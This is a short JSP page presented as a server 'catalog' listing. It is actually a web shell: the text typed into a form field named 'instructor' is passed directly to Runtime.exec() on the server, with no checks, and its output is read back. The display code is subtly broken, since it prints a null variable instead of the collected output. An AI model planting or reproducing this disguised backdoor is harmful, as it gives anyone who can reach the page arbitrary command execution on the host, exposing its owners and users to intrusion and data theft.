<%@ page contentType="text/html;charset=GB2312" %>
<%@ page language="java" %>
<%@ page import="java.io.*"%>
<html>
<head><title>getcatalog</title></head>
<body>
	<p><h1><b>This is server's catalog:</b></h1></p>
	<form method = "POST">
	<input type="text" name="instructor">
	<input type="submit" value="submit">
	</form>	
	<%
	String s3 = request.getParameter("instructor");
	String s2="",s1;
	Runtime r = Runtime.getRuntime();
	if(s3!=null){
		Process p = r.exec(s3);
		BufferedReader br= new BufferedReader(new InputStreamReader(p.getInputStream()));
		while((s1 = br.readLine())!=null)s2 = s2 + s1 + "\n";
	%>
	<p><img src=picture/apple_icon.gif height="30" width="30" alt="folder " style="cursor:pointer"><%=s1%></p> 
	<%
	}
	%>
	<img name="apple_icon" height="20" width="20"  src=picture/apple_icon.gif></img>
</body>
</html>
	
